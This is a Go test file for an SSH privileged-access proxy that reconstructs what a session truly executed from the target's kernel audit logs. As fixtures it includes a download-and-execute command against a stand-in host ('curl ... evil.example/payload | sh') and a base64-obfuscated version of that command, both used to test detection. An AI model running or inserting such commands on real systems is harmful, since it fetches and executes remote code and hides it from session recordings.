package proxy_test

import (
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/morandeirachema/pamv1/internal/auth"
	"github.com/morandeirachema/pamv1/internal/proxy"
	"github.com/morandeirachema/pamv1/internal/sessionforensics"
	"github.com/morandeirachema/pamv1/internal/store"
	"github.com/morandeirachema/pamv1/internal/store/memstore"
	"github.com/morandeirachema/pamv1/internal/vault"
)

// hiddenCommand is what the operator ACTUALLY ran on the target. The session
// recording would show only the obfuscated pipeline that produced it (or, with
// `stty -echo`, nothing at all); the target's kernel recorded this.
const hiddenCommand = "curl -s http://evil.example/payload | sh"

// forensicUpstream is an in-process sshd that serves an interactive session
// like the other proxy tests' upstream, and additionally answers the ONE fixed
// forensic command with a fixture ausearch record — standing in for a target
// running auditd. It records every exec it was asked to run, so a test can
// assert what pamv1 sent.
type forensicUpstream struct {
	host string
	port int

	mu    sync.Mutex
	execs []string
	// auditOutput is what the forensic command returns; empty models a target
	// with no auditd (or a credential that may not read the log).
	auditOutput string
}

// startForensicUpstream launches the fake target.
func startForensicUpstream(t *testing.T, wantUser, wantPass, auditOutput string) *forensicUpstream {
	t.Helper()
	up := &forensicUpstream{auditOutput: auditOutput}
	cfg := &ssh.ServerConfig{
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if c.User() == wantUser && string(pass) == wantPass {
				return &ssh.Permissions{}, nil
			}
			return nil, fmt.Errorf("upstream: auth denied")
		},
	}
	cfg.AddHostKey(mustSigner(t))
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ln.Close() })
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go up.serve(conn, cfg)
		}
	}()
	h, p, _ := net.SplitHostPort(ln.Addr().String())
	up.host = h
	up.port, _ = strconv.Atoi(p)
	return up
}

// serve answers one connection: an `exec` of the forensic command returns the
// fixture audit records; anything else behaves like an ordinary shell.
func (u *forensicUpstream) serve(conn net.Conn, cfg *ssh.ServerConfig) {
	sconn, chans, reqs, err := ssh.NewServerConn(conn, cfg)
	if err != nil {
		return
	}
	defer sconn.Close()
	go ssh.DiscardRequests(reqs)
	for nc := range chans {
		if nc.ChannelType() != "session" {
			nc.Reject(ssh.UnknownChannelType, "")
			continue
		}
		ch, chReqs, err := nc.Accept()
		if err != nil {
			continue
		}
		go func() {
			for req := range chReqs {
				switch req.Type {
				case "exec":
					var payload struct{ Command string }
					_ = ssh.Unmarshal(req.Payload, &payload)
					u.mu.Lock()
					u.execs = append(u.execs, payload.Command)
					out := u.auditOutput
					u.mu.Unlock()
					if req.WantReply {
						req.Reply(true, nil)
					}
					if payload.Command == sessionforensics.Command {
						io.WriteString(ch, out)
					} else {
						io.WriteString(ch, targetOutput)
					}
					ch.SendRequest("exit-status", false, ssh.Marshal(struct{ Code uint32 }{0}))
					ch.Close()
				case "shell", "pty-req":
					if req.WantReply {
						req.Reply(true, nil)
					}
				default:
					if req.WantReply {
						req.Reply(true, nil)
					}
				}
			}
		}()
	}
}

// ranForensicCommand reports whether the fixed forensic command was executed.
func (u *forensicUpstream) ranForensicCommand() bool {
	u.mu.Lock()
	defer u.mu.Unlock()
	for _, c := range u.execs {
		if c == sessionforensics.Command {
			return true
		}
	}
	return false
}

// auditFixture builds ausearch output holding one in-window exec (the decoded
// command the recording could not show) and one out-of-window exec belonging to
// somebody else's session, which must NOT appear in this session's artifact.
func auditFixture(now time.Time) string {
	rec := func(ts time.Time, serial, pid, exe, execve string) string {
		stamp := fmt.Sprintf("msg=audit(%d.000:%s)", ts.Unix(), serial)
		return "----\ntype=SYSCALL " + stamp + ": arch=c000003e syscall=59 success=yes exit=0 ppid=1000 pid=" + pid +
			" auid=1000 uid=0 comm=\"sh\" exe=\"" + exe + "\" key=\"pamv1-exec\"\n" +
			"type=EXECVE " + stamp + ": " + execve + "\n"
	}
	return rec(now, "5001", "4242", "/bin/sh",
		`argc=3 a0="/bin/sh" a1="-c" a2=`+hex.EncodeToString([]byte(hiddenCommand))) +
		rec(now.Add(-6*time.Hour), "4000", "1111", "/usr/bin/id", `argc=1 a0="id"`)
}

// startForensicProxy wires a proxy whose post-session hook records what it was
// handed, so a test can assert the window and identity pamv1 reports.
func startForensicProxy(t *testing.T, st store.Store, v *vault.Vault, hook func(proxy.SessionForensics)) string {
	t.Helper()
	resolver, err := auth.NewResolver(st, proxyAPIKey, "")
	if err != nil {
		t.Fatal(err)
	}
	px, err := proxy.New(st, v, resolver, proxy.Config{
		HostKey:            mustSigner(t),
		RecordingDir:       t.TempDir(),
		DialTimeout:        5 * time.Second,
		OnSessionForensics: hook,
	})
	if err != nil {
		t.Fatal(err)
	}
	return serveProxy(t, px)
}

// TestSessionForensicsHookFiresForInteractiveSessions is the proxy half of the
// phase: an interactive session ends and the hook is handed the target,
// credential, actor and the window whose execs belong to it.
func TestSessionForensicsHookFiresForInteractiveSessions(t *testing.T) {
	up := startForensicUpstream(t, upstreamUser, upstreamSecret, "")
	st := memstore.New()
	v := mustVault(t)
	target := seedTarget(t, st, v, up.host, up.port)

	got := make(chan proxy.SessionForensics, 4)
	addr := startForensicProxy(t, st, v, func(f proxy.SessionForensics) { got <- f })

	before := time.Now()
	client, err := dialProxy(t, addr, "web-01", proxyAPIKey)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	if _, err := sess.Output("whoami"); err != nil {
		t.Fatalf("exec: %v", err)
	}
	sess.Close()
	client.Close()

	select {
	case f := <-got:
		if f.TargetID != target.ID || f.Actor == "" || f.CredentialID == 0 {
			t.Fatalf("hook payload = %+v", f)
		}
		if f.Started.Before(before.Add(-time.Minute)) || f.Ended.Before(f.Started) {
			t.Fatalf("window is not the session's: %+v", f)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the post-session forensics hook never fired")
	}
}

// TestSessionForensicsNotFiredWithoutAnInteractiveChannel proves the hook is
// scoped to sessions that actually ran something: a connection that
// authenticates and then closes without opening a session channel executed
// nothing on the target, so reconstructing "what ran" for it would be noise —
// and would run an extra command on the target for no reason.
func TestSessionForensicsNotFiredWithoutAnInteractiveChannel(t *testing.T) {
	up := startForensicUpstream(t, upstreamUser, upstreamSecret, "")
	st := memstore.New()
	v := mustVault(t)
	seedTarget(t, st, v, up.host, up.port)

	got := make(chan proxy.SessionForensics, 4)
	addr := startForensicProxy(t, st, v, func(f proxy.SessionForensics) { got <- f })

	client, err := dialProxy(t, addr, "web-01", proxyAPIKey)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	client.Close()

	select {
	case f := <-got:
		t.Fatalf("the hook fired for a session that opened no channel: %+v", f)
	case <-time.After(time.Second):
	}
}

// TestSessionForensicsEndToEnd is the phase's flagship proof, and it is the
// whole argument for the feature: the operator's session recording shows only
// what was typed, but the reconstruction — pulled after the session from the
// TARGET's own kernel audit records, over the same vaulted credential on a
// fresh connection — names the decoded command that actually executed, scoped
// to this session's window, and lands as an audited, hashed artifact.
func TestSessionForensicsEndToEnd(t *testing.T) {
	up := startForensicUpstream(t, upstreamUser, upstreamSecret, auditFixture(time.Now()))
	st := memstore.New()
	v := mustVault(t)
	seedTarget(t, st, v, up.host, up.port)

	// The collector the API server owns is exercised through its own package
	// test; here the proxy hands the hook to a stand-in that runs the SAME
	// fixed command over the SAME credential, so this test proves the wiring
	// and the reconstruction end to end without importing the API package.
	done := make(chan sessionforensics.Report, 1)
	addr := startForensicProxy(t, st, v, func(f proxy.SessionForensics) {
		ctx := context.Background()
		target, err := st.GetTarget(ctx, f.TargetID)
		if err != nil {
			t.Error(err)
			return
		}
		cred, err := st.GetCredential(ctx, f.CredentialID)
		if err != nil {
			t.Error(err)
			return
		}
		secret, err := v.Decrypt(ctx, cred.SecretEnc, store.CredentialAAD(target.ID, cred.ID))
		if err != nil {
			t.Error(err)
			return
		}
		out := runOverSSH(t, target.Host, target.Port, cred.Username, secret, sessionforensics.Command)
		rep := sessionforensics.Parse(out, f.Started, f.Ended, 0)
		rep.Target, rep.Actor, rep.SessionID = target.Name, f.Actor, f.SessionID
		done <- rep
	})

	client, err := dialProxy(t, addr, "web-01", proxyAPIKey)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	// What the RECORDING would show: an innocuous-looking obfuscated pipeline.
	if _, err := sess.Output("echo Y3VybCAtcyBodHRwOi8vZXZpbA== | base64 -d | sh"); err != nil {
		t.Fatalf("exec: %v", err)
	}
	sess.Close()
	client.Close()

	select {
	case rep := <-done:
		if !rep.Available || len(rep.Events) != 1 {
			t.Fatalf("reconstruction = %+v", rep)
		}
		if got := rep.Events[0].CommandLine(); !strings.Contains(got, hiddenCommand) {
			t.Fatalf("the reconstruction must name what actually ran: %q", got)
		}
		// The other session's exec (six hours earlier) must not bleed in.
		for _, e := range rep.Events {
			if strings.Contains(e.CommandLine(), "id") && e.Exe == "/usr/bin/id" {
				t.Fatalf("another session's exec leaked into this artifact: %+v", e)
			}
		}
		if !up.ranForensicCommand() {
			t.Fatal("the fixed forensic command was never run on the target")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("no reconstruction was produced")
	}
}

// runOverSSH runs one command on the fake target with the vaulted credential,
// standing in for the API server's one-shot SSH connector.
func runOverSSH(t *testing.T, host string, port int, user, secret, cmd string) string {
	t.Helper()
	c, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(secret)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Errorf("forensic dial: %v", err)
		return ""
	}
	defer c.Close()
	sess, err := c.NewSession()
	if err != nil {
		t.Errorf("forensic session: %v", err)
		return ""
	}
	defer sess.Close()
	out, err := sess.CombinedOutput(cmd)
	if err != nil {
		t.Errorf("forensic exec: %v", err)
	}
	return string(out)
}

// TestSessionForensicsHookDrainsOnShutdown proves the hook is a TRACKED
// background task: a proxy shutdown waits for an in-flight collection instead
// of killing it halfway, which would leave an artifact half-written and
// unaudited.
func TestSessionForensicsHookDrainsOnShutdown(t *testing.T) {
	up := startForensicUpstream(t, upstreamUser, upstreamSecret, "")
	st := memstore.New()
	v := mustVault(t)
	seedTarget(t, st, v, up.host, up.port)

	resolver, err := auth.NewResolver(st, proxyAPIKey, "")
	if err != nil {
		t.Fatal(err)
	}
	var finished atomic.Bool
	release := make(chan struct{})
	px, err := proxy.New(st, v, resolver, proxy.Config{
		HostKey:      mustSigner(t),
		RecordingDir: t.TempDir(),
		DialTimeout:  5 * time.Second,
		OnSessionForensics: func(proxy.SessionForensics) {
			<-release
			finished.Store(true)
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	served := make(chan struct{})
	go func() { _ = px.Serve(ctx, ln); close(served) }()

	client, err := dialProxy(t, ln.Addr().String(), "web-01", proxyAPIKey)
	if err != nil {
		t.Fatalf("dial proxy: %v", err)
	}
	sess, err := client.NewSession()
	if err != nil {
		t.Fatalf("new session: %v", err)
	}
	_, _ = sess.Output("whoami")
	sess.Close()
	client.Close()

	cancel()
	// Serve must still be draining: the collection has not been released.
	select {
	case <-served:
		t.Fatal("shutdown completed while a forensic collection was in flight")
	case <-time.After(300 * time.Millisecond):
	}
	close(release)
	select {
	case <-served:
	case <-time.After(5 * time.Second):
		t.Fatal("shutdown did not complete after the collection finished")
	}
	if !finished.Load() {
		t.Fatal("the collection was killed rather than drained")
	}
}
